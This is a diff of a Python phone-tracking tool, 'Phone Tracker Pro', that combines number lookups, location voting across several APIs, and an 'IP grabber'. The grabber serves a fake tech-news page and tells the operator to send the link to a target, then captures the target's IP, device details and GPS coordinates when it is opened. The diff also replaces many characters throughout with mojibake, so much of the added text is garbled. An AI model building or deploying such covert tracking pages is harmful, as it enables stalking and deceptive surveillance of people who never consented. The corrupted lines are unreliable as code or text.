@@ -1,14 +1,14 @@
-#!/usr/bin/env python3
+﻿#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PHONE TRACKER PRO v5.0 — Law Enforcement Grade Phone Intelligence System
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+PHONE TRACKER PRO v5.0 ÔÇö Law Enforcement Grade Phone Intelligence System
+ÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöüÔöü
 Features: Multi-API Live Location, HLR/VLR Simulation, IP Grabber Link,
           OSINT Platform Probes, India Telecom Circle DB (700+ prefixes),
           CDR-style Evidence Reports, Chain-of-Custody Logging,
           SHA-256 Evidence Integrity, Case Management, Audit Trail
 Author: Vishal | AUTHORIZED LAW ENFORCEMENT & SECURITY RESEARCH USE ONLY
-Classification: RESTRICTED — Handle per applicable data protection laws
+Classification: RESTRICTED ÔÇö Handle per applicable data protection laws
 """
 
 import os, sys, json, time, socket, argparse, re, hashlib, uuid, logging
@@ -40,7 +40,7 @@ from folium.plugins import HeatMap
 VERSION = "5.0.0"
 console = Console()
 
-# ── Audit Logger ──────────────────────────────────────────────────────────
+# ÔöÇÔöÇ Audit Logger ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
 LOG_DIR = Path("output/audit_logs")
 LOG_DIR.mkdir(parents=True, exist_ok=True)
 audit_logger = logging.getLogger("PhoneTrackerAudit")
@@ -89,9 +89,9 @@ class AuditLogger:
 
 # Classification levels for reports
 CLASSIFICATION = {
-    "OPEN":       "🟢 OPEN — Unclassified",
-    "RESTRICTED": "🟡 RESTRICTED — Official Use Only",
-    "CONFIDENTIAL": "🔴 CONFIDENTIAL — LEA Eyes Only",
+    "OPEN":       "­ƒƒó OPEN ÔÇö Unclassified",
+    "RESTRICTED": "­ƒƒí RESTRICTED ÔÇö Official Use Only",
+    "CONFIDENTIAL": "­ƒö┤ CONFIDENTIAL ÔÇö LEA Eyes Only",
 }
 
 # API keys loaded from .env or environment
@@ -103,23 +103,23 @@ TRESTLE_API_KEY = os.environ.get("TRESTLE_API_KEY", "")
 
 BANNER = r"""
 [bold red]
- ██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗  ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗
- ██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝  ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
- ██████╔╝███████║██║   ██║██╔██╗ ██║█████╗       ██║   ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
- ██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝       ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
- ██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
- ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+ ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔòù  ÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòùÔûêÔûêÔòù  ÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔòù
+ ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔûêÔûêÔòöÔòÉÔòÉÔòØÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØÔûêÔûêÔòæ ÔûêÔûêÔòöÔòØÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
+ ÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòöÔûêÔûêÔòù ÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔòù       ÔûêÔûêÔòæ   ÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòæ     ÔûêÔûêÔûêÔûêÔûêÔòöÔòØ ÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ
+ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòæÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæÔòÜÔûêÔûêÔòùÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòØ       ÔûêÔûêÔòæ   ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòæÔûêÔûêÔòæ     ÔûêÔûêÔòöÔòÉÔûêÔûêÔòù ÔûêÔûêÔòöÔòÉÔòÉÔòØ  ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
+ ÔûêÔûêÔòæ     ÔûêÔûêÔòæ  ÔûêÔûêÔòæÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòù     ÔûêÔûêÔòæ   ÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòùÔûêÔûêÔòæ  ÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòùÔûêÔûêÔòæ  ÔûêÔûêÔòæ
+ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØ ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòØÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ     ÔòÜÔòÉÔòØ   ÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØ ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØ
 [/bold red]
-[bold cyan]  ██████╗ ██████╗  ██████╗    ██╗   ██╗███████╗    ██████╗
-  ██╔══██╗██╔══██╗██╔═══██╗   ██║   ██║██╔════╝   ██╔═████╗
-  ██████╔╝██████╔╝██║   ██║   ██║   ██║███████╗   ██║██╔██║
-  ██╔═══╝ ██╔══██╗██║   ██║   ╚██╗ ██╔╝╚════██║   ████╔╝██║
-  ██║     ██║  ██║╚██████╔╝    ╚████╔╝ ███████║██╗╚██████╔╝
-  ╚═╝     ╚═╝  ╚═╝ ╚═════╝      ╚═══╝  ╚══════╝╚═╝ ╚═════╝
+[bold cyan]  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù    ÔûêÔûêÔòù   ÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòù    ÔûêÔûêÔûêÔûêÔûêÔûêÔòù
+  ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòù   ÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ   ÔûêÔûêÔòöÔòÉÔûêÔûêÔûêÔûêÔòù
+  ÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ   ÔûêÔûêÔòæ   ÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòù   ÔûêÔûêÔòæÔûêÔûêÔòöÔûêÔûêÔòæ
+  ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòæ   ÔûêÔûêÔòæ   ÔòÜÔûêÔûêÔòù ÔûêÔûêÔòöÔòØÔòÜÔòÉÔòÉÔòÉÔòÉÔûêÔûêÔòæ   ÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ
+  ÔûêÔûêÔòæ     ÔûêÔûêÔòæ  ÔûêÔûêÔòæÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ    ÔòÜÔûêÔûêÔûêÔûêÔòöÔòØ ÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòùÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ
+  ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØ ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ      ÔòÜÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòØÔòÜÔòÉÔòØ ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ
 [/bold cyan]
 [bold yellow]  Law Enforcement Grade Phone Intelligence System[/bold yellow]
-[bold green]  CDR Analysis • HLR/VLR • Live Location • OSINT • IP Grabber[/bold green]
-[bold red]  ⚠  AUTHORIZED USE ONLY — All operations are audit-logged[/bold red]
+[bold green]  CDR Analysis ÔÇó HLR/VLR ÔÇó Live Location ÔÇó OSINT ÔÇó IP Grabber[/bold green]
+[bold red]  ÔÜá  AUTHORIZED USE ONLY ÔÇö All operations are audit-logged[/bold red]
 """
 
 USER_AGENTS = [
@@ -139,7 +139,7 @@ class PhoneTrackerPro:
     """
 
     def __init__(self, phone_number: str, case_id: str = "", officer: str = "", classification: str = "RESTRICTED"):
-        # ── Case Management ────────────────────────────────────────────
+        # ÔöÇÔöÇ Case Management ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
         self.case_id = case_id or f"CASE-{datetime.now(timezone.utc).strftime('%Y%m%d')}-{uuid.uuid4().hex[:6].upper()}"
         self.officer = officer or os.getenv("OFFICER_NAME", "OPERATOR")
         self.officer_name = self.officer  # alias used in reports
@@ -153,7 +153,7 @@ class PhoneTrackerPro:
 
         self._log_evidence("SCAN_INITIATED", f"Target={phone_number}, Officer={self.officer}, Case={self.case_id}")
 
-        # ── Phone Number Fields ────────────────────────────────────────
+        # ÔöÇÔöÇ Phone Number Fields ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
         self.raw_number = phone_number.strip()
         self.phone_number = phone_number.strip()
         self.parsed = None
@@ -180,9 +180,9 @@ class PhoneTrackerPro:
         self.timezone = ""
         self.timezones = []
 
-        # ── Forensic / CDR Fields ──────────────────────────────────────
-        self.imsi = "N/A — Requires operator cooperation"
-        self.imei = "N/A — Requires operator cooperation"
+        # ÔöÇÔöÇ Forensic / CDR Fields ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
+        self.imsi = "N/A ÔÇö Requires operator cooperation"
+        self.imei = "N/A ÔÇö Requires operator cooperation"
         self.hlr_status = ""      # "ACTIVE" / "INACTIVE" / "UNKNOWN"
         self.msc_address = ""     # Mobile Switching Center
         self.vlr_address = ""     # Visitor Location Register
@@ -192,7 +192,7 @@ class PhoneTrackerPro:
         self.roaming_network = ""
         self.last_activity = ""
 
-        # ── Intelligence Collections ───────────────────────────────────
+        # ÔöÇÔöÇ Intelligence Collections ÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇÔöÇ
         self.telecom_circle = {}
         self.osint_results = {}
         self.deep_osint = {}
@@ -270,7 +270,7 @@ class PhoneTrackerPro:
             self.is_valid = self.valid
             self.is_possible = phonenumbers.is_possible_number(self.parsed)
             if not self.valid and not self.is_possible:
-                console.print("[bold red]  ✗ Invalid phone number![/bold red]")
+                console.print("[bold red]  Ô£ù Invalid phone number![/bold red]")
                 return False
             self.international_format = phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
             self.national_format = phonenumbers.format_number(self.parsed, phonenumbers.PhoneNumberFormat.NATIONAL)
@@ -279,11 +279,11 @@ class PhoneTrackerPro:
             self.national_number = str(self.parsed.national_number)
             self.phone_number = self.e164_format
             self._log_evidence("NUMBER_PARSED", f"E164={self.e164_format}, Valid={self.valid}, CC={self.country_code}")
-            console.print(f"[green]  ✓ Valid: {self.international_format}[/green]")
+            console.print(f"[green]  Ô£ô Valid: {self.international_format}[/green]")
             return True
         except phonenumbers.NumberParseException as e:
             self._log_evidence("PARSE_FAILED", str(e))
-            console.print(f"[bold red]  ✗ Parse error: {e}[/bold red]")
+            console.print(f"[bold red]  Ô£ù Parse error: {e}[/bold red]")
             return False
 
     def get_basic_info(self):
@@ -345,7 +345,7 @@ class PhoneTrackerPro:
         self._log_evidence("BASIC_INFO_COLLECTED", f"Carrier={self.carrier_name}, Country={self.country_name}, Type={self.line_type}")
 
     def display_basic_info(self):
-        table = Table(title="📋 SUBSCRIBER INFORMATION (CDR-STYLE)", box=box.HEAVY_EDGE, 
+        table = Table(title="­ƒôï SUBSCRIBER INFORMATION (CDR-STYLE)", box=box.HEAVY_EDGE, 
                       title_style="bold cyan", border_style="bright_blue", show_lines=True)
         table.add_column("Field", style="bold yellow", width=28)
         table.add_column("Value", style="bold white", width=45)
@@ -363,7 +363,7 @@ class PhoneTrackerPro:
         table.add_row("Country Code", self.country_code)
         table.add_row("Country", self.country_name)
         table.add_row("Region", self.region)
-        table.add_row("City (Geocoder)", self.city or "—")
+        table.add_row("City (Geocoder)", self.city or "ÔÇö")
         table.add_row("", "")  # separator
 
         table.add_row("Carrier / Operator", self.carrier_name or "Unknown")
@@ -374,7 +374,7 @@ class PhoneTrackerPro:
         table.add_row("IMEI", f"[dim]{self.imei}[/dim]")
         table.add_row("Number Valid", "[green]YES[/green]" if self.valid else "[red]NO[/red]")
         table.add_row("Number Possible", "[green]YES[/green]" if self.is_possible else "[red]NO[/red]")
-        table.add_row("Timezone", ", ".join(self.timezones[:2]) if self.timezones else "—")
+        table.add_row("Timezone", ", ".join(self.timezones[:2]) if self.timezones else "ÔÇö")
         console.print()
         console.print(table)
 
@@ -774,7 +774,7 @@ class PhoneTrackerPro:
 
         # Show voting table
         console.print()
-        vtable = Table(title="🗳️  LOCATION CROSS-REFERENCE VOTING", border_style="cyan", show_lines=True)
+        vtable = Table(title="­ƒù│´©Å  LOCATION CROSS-REFERENCE VOTING", border_style="cyan", show_lines=True)
         vtable.add_column("API Source", style="bold white", width=20)
         vtable.add_column("Location Vote", style="green", width=25)
         vtable.add_column("Confidence", style="yellow", width=12)
@@ -810,7 +810,7 @@ class PhoneTrackerPro:
             except Exception as e:
                 console.print(f"[dim]  {name} failed: {e}[/dim]")
 
-        # Consensus voting — pick the city with most agreement
+        # Consensus voting ÔÇö pick the city with most agreement
         self._consensus_vote()
 
         # Display final results
@@ -837,7 +837,7 @@ class PhoneTrackerPro:
                         self.current_carrier = crr
                     if lt:
                         self.line_type = lt
-                    console.print(f"[green]  ✓ NumVerify: {loc or 'N/A'} | {crr or 'N/A'} | {lt or 'N/A'}[/green]")
+                    console.print(f"[green]  Ô£ô NumVerify: {loc or 'N/A'} | {crr or 'N/A'} | {lt or 'N/A'}[/green]")
         except Exception as e:
             console.print(f"[dim]  NumVerify: {e}[/dim]")
 
@@ -858,7 +858,7 @@ class PhoneTrackerPro:
                         self._add_vote(loc, "AbstractAPI", 0.65)
                     if crr and not self.current_carrier:
                         self.current_carrier = crr
-                    console.print(f"[green]  ✓ AbstractAPI: {loc or 'N/A'} | {crr or 'N/A'}[/green]")
+                    console.print(f"[green]  Ô£ô AbstractAPI: {loc or 'N/A'} | {crr or 'N/A'}[/green]")
         except Exception as e:
             console.print(f"[dim]  AbstractAPI: {e}[/dim]")
 
@@ -877,8 +877,8 @@ class PhoneTrackerPro:
                 self.live_location["ip_detected"] = True
                 self.live_location["ip_location"] = f"{my_city}, {my_region}"
                 # This is YOUR IP, so it's useful if scanning your own number
-                console.print(f"[green]  ✓ Your IP: {my_city}, {my_region}[/green]")
-                console.print(f"[dim]    (Your device location — useful if checking own number)[/dim]")
+                console.print(f"[green]  Ô£ô Your IP: {my_city}, {my_region}[/green]")
+                console.print(f"[dim]    (Your device location ÔÇö useful if checking own number)[/dim]")
                 if my_loc:
                     try:
                         lat, lon = my_loc.split(",")
@@ -942,7 +942,7 @@ class PhoneTrackerPro:
 
                 # Output to CLI
                 status_color = "green" if is_active else "yellow"
-                console.print(f"[{status_color}]  ✓ Trestle: Activity {activity_score}/100 | Type: {line_type_fidelity or 'Unknown'} | Carrier: {crr or 'Unknown'}[/{status_color}]")
+                console.print(f"[{status_color}]  Ô£ô Trestle: Activity {activity_score}/100 | Type: {line_type_fidelity or 'Unknown'} | Carrier: {crr or 'Unknown'}[/{status_color}]")
             else:
                 console.print(f"[dim]  Trestle API Error: {resp.status_code}[/dim]")
 
@@ -968,7 +968,7 @@ class PhoneTrackerPro:
                                 val = cells[1].get_text(strip=True)
                                 if ("circle" in key or "state" in key) and val:
                                     self._add_vote(val, "FindAndTrace", 0.55)
-                                    console.print(f"[green]  ✓ FindAndTrace: {val}[/green]")
+                                    console.print(f"[green]  Ô£ô FindAndTrace: {val}[/green]")
                                     return
                                 elif "operator" in key and val:
                                     if not self.current_carrier:
@@ -1003,7 +1003,7 @@ class PhoneTrackerPro:
                                     loc = match.group(1).strip().title()
                                     if loc and len(loc) > 2 and loc.lower() not in ["india", "unknown", "n/a"]:
                                         self._add_vote(loc, "VLR/Web", 0.5)
-                                        console.print(f"[green]  ✓ VLR/Web: {loc}[/green]")
+                                        console.print(f"[green]  Ô£ô VLR/Web: {loc}[/green]")
                                         return
                     except Exception:
                         continue
@@ -1025,7 +1025,7 @@ class PhoneTrackerPro:
                         loc = data.get("location", data.get("city", data.get("region", "")))
                         if loc:
                             self._add_vote(loc, "PhoneInfo", 0.5)
-                            console.print(f"[green]  ✓ PhoneInfo: {loc}[/green]")
+                            console.print(f"[green]  Ô£ô PhoneInfo: {loc}[/green]")
                             return
                 except Exception:
                     pass
@@ -1053,7 +1053,7 @@ class PhoneTrackerPro:
                                     val = cells[1].get_text(strip=True)
                                     if ("state" in key or "circle" in key or "location" in key) and val:
                                         self._add_vote(val, "MobileTracker", 0.45)
-                                        console.print(f"[green]  ✓ MobileTracker: {val}[/green]")
+                                        console.print(f"[green]  Ô£ô MobileTracker: {val}[/green]")
                                         return
                 except Exception:
                     pass
@@ -1071,7 +1071,7 @@ class PhoneTrackerPro:
             conf_color = "green" if conf >= 0.7 else "yellow" if conf >= 0.5 else "red"
             conf_pct = f"{int(conf * 100)}%"
 
-            table = Table(title="📍 LIVE/ACTIVE LOCATION", border_style="cyan", show_lines=True)
+            table = Table(title="­ƒôì LIVE/ACTIVE LOCATION", border_style="cyan", show_lines=True)
             table.add_column("Field", style="bold white", width=25)
             table.add_column("Value", style="green", width=45)
             table.add_row("Active/Current City", f"[bold green]{city}[/bold green]")
@@ -1104,7 +1104,7 @@ class PhoneTrackerPro:
                 self.live_location["confidence"] = 0.3
 
     # =====================================================================
-    # PART 3B: IP GRABBER LINK — Capture real IP + GPS when target clicks
+    # PART 3B: IP GRABBER LINK ÔÇö Capture real IP + GPS when target clicks
     # =====================================================================
     def generate_ip_grabber(self, port=8888):
         """Generate an IP grabber tracking link.
@@ -1133,14 +1133,14 @@ class PhoneTrackerPro:
         results_path = f"output/grab_{track_id}.json"
         self.ip_grab_results = {"track_id": track_id, "captures": []}
 
-        console.print(f"[bold green]  ✓ Tracking page created: {page_path}[/bold green]")
+        console.print(f"[bold green]  Ô£ô Tracking page created: {page_path}[/bold green]")
         console.print()
 
         # Get local & public IP for link generation
         local_ip = self._get_local_ip()
         public_ip = self._get_public_ip()
 
-        console.print(Panel(f"""[bold yellow]📎 IP GRABBER LINKS — Send one of these to the target:[/bold yellow]
+        console.print(Panel(f"""[bold yellow]­ƒôÄ IP GRABBER LINKS ÔÇö Send one of these to the target:[/bold yellow]
 
 [bold green]  Local Network (same WiFi):[/bold green]
     http://{local_ip}:{port}/t/{track_id}
@@ -1148,7 +1148,7 @@ class PhoneTrackerPro:
 [bold green]  Public (if port {port} is forwarded / use ngrok):[/bold green]
     http://{public_ip}:{port}/t/{track_id}
 
-[bold cyan]  💡 TIP: Use ngrok for a public HTTPS link:[/bold cyan]
+[bold cyan]  ­ƒÆí TIP: Use ngrok for a public HTTPS link:[/bold cyan]
     1. Install: brew install ngrok  (or download from ngrok.com)
     2. Run:     ngrok http {port}
     3. Copy the https://xxxxx.ngrok.io URL
@@ -1156,10 +1156,10 @@ class PhoneTrackerPro:
 
 [bold yellow]  The link looks like a normal webpage (news article).[/bold yellow]
 [bold yellow]  When target opens it, their IP + location is captured.[/bold yellow]
-[bold red]  If they allow browser location → exact GPS coordinates![/bold red]
+[bold red]  If they allow browser location ÔåÆ exact GPS coordinates![/bold red]
 
 [dim]  Press Ctrl+C to stop the server when done.[/dim]""",
-            title="[bold red]🎯 TRACKING LINKS[/bold red]", border_style="red"))
+            title="[bold red]­ƒÄ» TRACKING LINKS[/bold red]", border_style="red"))
 
         # Start the Flask server
         self._start_grab_server(port, track_id, tracking_html, results_path)
@@ -1224,7 +1224,7 @@ class PhoneTrackerPro:
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Breaking: Major Tech Update — Read Now</title>
+<title>Breaking: Major Tech Update ÔÇö Read Now</title>
 <style>
 *{{margin:0;padding:0;box-sizing:border-box}}
 body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
@@ -1245,11 +1245,11 @@ border-top-color:#3498db;border-radius:50%;animation:spin 1s linear infinite}}
 </style>
 </head>
 <body>
-<div class="header"><h1>📰 TechPulse Daily</h1></div>
+<div class="header"><h1>­ƒô░ TechPulse Daily</h1></div>
 <div class="container">
 <div class="article">
-<div class="meta">Technology • 2 min read • {datetime.now().strftime('%B %d, %Y')}</div>
-<h2>Major Security Update Released — What You Need to Know</h2>
+<div class="meta">Technology ÔÇó 2 min read ÔÇó {datetime.now().strftime('%B %d, %Y')}</div>
+<h2>Major Security Update Released ÔÇö What You Need to Know</h2>
 <p>A major security update has been released that affects millions of users worldwide.
 Experts recommend updating your devices immediately to protect against newly discovered
 vulnerabilities.</p>
@@ -1379,7 +1379,7 @@ for all supported devices.</p>
             capture_num = len(captures)
 
             console.print()
-            console.print(Panel(f"""[bold red]🚨 TARGET CAPTURED![/bold red]
+            console.print(Panel(f"""[bold red]­ƒÜ¿ TARGET CAPTURED![/bold red]
 
 [bold green]  IP Address:[/bold green]   {real_ip}
 [bold green]  IP City:[/bold green]      {ip_city}, {ip_region}
@@ -1389,13 +1389,13 @@ for all supported devices.</p>
 [bold green]  Browser:[/bold green]      {data.get('userAgent', '?')[:60]}
 [bold green]  Screen:[/bold green]       {data.get('screenW', '?')}x{data.get('screenH', '?')}
 
-{'[bold red]  🎯 GPS LOCATION:[/bold red]' if gps_lat else '[yellow]  GPS: Not allowed by target[/yellow]'}
+{'[bold red]  ­ƒÄ» GPS LOCATION:[/bold red]' if gps_lat else '[yellow]  GPS: Not allowed by target[/yellow]'}
 {'  Latitude:  ' + str(gps_lat) if gps_lat else ''}
 {'  Longitude: ' + str(gps_lon) if gps_lon else ''}
 {'  Accuracy:  ' + str(round(gps_acc, 1)) + ' meters' if gps_acc else ''}
 
 [dim]  Saved to: {results_path}[/dim]""",
-                title=f"[bold red]🎯 IP GRAB — CAPTURE #{capture_num}[/bold red]",
+                title=f"[bold red]­ƒÄ» IP GRAB ÔÇö CAPTURE #{capture_num}[/bold red]",
                 border_style="red"))
 
             # Update live_location if we got GPS
@@ -1410,8 +1410,8 @@ for all supported devices.</p>
 
             return jsonify({"status": "ok"})
 
-        console.print(f"\n[bold cyan]  🌐 Server running on port {port}...[/bold cyan]")
-        console.print(f"[bold cyan]  📡 Waiting for target to click the link...[/bold cyan]")
+        console.print(f"\n[bold cyan]  ­ƒîÉ Server running on port {port}...[/bold cyan]")
+        console.print(f"[bold cyan]  ­ƒôí Waiting for target to click the link...[/bold cyan]")
         console.print(f"[dim]  Press Ctrl+C to stop.[/dim]\n")
 
         try:
@@ -1473,7 +1473,7 @@ for all supported devices.</p>
                     ann = r.get("annotations", {})
                     tz = ann.get("timezone", {})
                     self.timezone = tz.get("name", "")
-                    console.print(f"[green]  ✓ OpenCage: {self.latitude}, {self.longitude}[/green]")
+                    console.print(f"[green]  Ô£ô OpenCage: {self.latitude}, {self.longitude}[/green]")
                     console.print(f"[green]    {self.formatted_address}[/green]")
                     return True
         except Exception as e:
@@ -1499,7 +1499,7 @@ for all supported devices.</p>
                     self.city = addr.get("city", addr.get("town", addr.get("village", city)))
                     self.state = addr.get("state", circle_name)
                     self.formatted_address = r.get("display_name", "")
-                    console.print(f"[green]  ✓ Nominatim: {self.latitude}, {self.longitude}[/green]")
+                    console.print(f"[green]  Ô£ô Nominatim: {self.latitude}, {self.longitude}[/green]")
                     return True
         except Exception as e:
             console.print(f"[dim]  Nominatim error: {e}[/dim]")
@@ -1509,7 +1509,7 @@ for all supported devices.</p>
         if not self.latitude:
             console.print("[yellow]  No coordinates found.[/yellow]")
             return
-        table = Table(title="🌍 GEOLOCATION DATA", border_style="green", show_lines=True)
+        table = Table(title="­ƒîì GEOLOCATION DATA", border_style="green", show_lines=True)
         table.add_column("Field", style="bold white", width=25)
         table.add_column("Value", style="green", width=50)
         table.add_row("City", str(self.city))
@@ -1532,10 +1532,10 @@ for all supported devices.</p>
         console.print(table)
 
     # =====================================================================
-    # PART 5: OSINT — Platform Probes
+    # PART 5: OSINT ÔÇö Platform Probes
     # =====================================================================
     def run_osint(self):
-        console.print(Panel("[bold cyan]PHASE 5: OSINT — PLATFORM INTELLIGENCE[/bold cyan]", border_style="cyan"))
